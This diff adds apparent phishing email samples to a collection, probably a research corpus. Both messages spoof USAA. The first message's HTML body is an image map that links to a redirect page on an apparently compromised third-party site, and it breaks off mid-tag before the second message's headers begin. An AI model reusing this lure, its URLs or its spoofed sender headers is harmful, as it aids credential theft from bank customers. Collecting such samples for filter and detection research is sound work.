@@ -1,0 +1,32 @@
+From: "USAA" <USAA.user.services@us.army.mil>
+Subject: Important Notification
+To: jose.ramos@qatar.army.mil
+Content-Type: text/html;iso-8859-1
+Reply-To: USAA.user.services@us.army.mil
+Date: Wed, 9 Dec 2015 15:00:00 -0600
+X-Priority: 3
+X-Library: Indy 8.0.25
+Return-Path: USAA.user.services@us.army.mil
+Message-ID: <TSERVER8s4KWiGtXsL100000660@TSERVER.CPCInc.local>
+X-OriginalArrivalTime: 09 Dec 2015 21:00:00.0207 (UTC) FILETIME=[913C1DF0:01D132C4]
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 283
+
+<img src="http://www.vecogest.pt/media/.svn/usaaMessage.png" alt="" usemap="#map1449582424669">
+<map id="map1449582424669" name="map1449582424669"><area shape="rect" coords="11,288,141,307" title="" alt="" href="http://www.vecogest.pt/media/redirect-true.php" target="_self"><area shape="rect" coords="515,591,516,592" alt="
+
+From jose@monkey.org Thu Dec 10 14:50:51 2015 +0000
+Return-Path: usaa.customer.service@usaa.com
+Delivered-To: jose@monkey.org
+X-FDA: 70947841902.06.rake46_764d789bbe22
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 10,1,0,d41d8cd98f00b204,d41d8cd98f00b204,usaa.customer.service@usaa.com,:,RULES_HIT:327:355:379:677:871:988:989:1000:1260:1308:1309:1313:1314:1345:1381:1516:1517:1522:1575:1692:1699:1730:1747:1764:1777:1792:1803:1823:2392:2393:2568:2926:3043:3138:3139:3140:3141:3142:3876:3877:5007:6114:6261:6506:6642:6747:6748:7281:7398:10007:10265:11604:11914:13110:14659:21080:30001:30003:30019:30021:30054:30055:30064:30070:30075:30080,0,RBL:173.13.78.138:@usaa.com:.lbl8.mailshell.net-62.20.0.100 64.201.201.201,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:ff,MSBL:0,DNSBL:none,Custom_rules:0:1:0,LFtime:11,LUA_SUMMARY:none
+X-HE-Tag: rake46_764d789bbe22
+X-Filterd-Recvd-Size: 21921
+Received: from usaa.com (173-13-78-138-NewEngland.hfc.comcastbusiness.net [173.13.78.138])
+	by imf22.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Thu, 10 Dec 2015 14:50:50 +0000 (UTC)
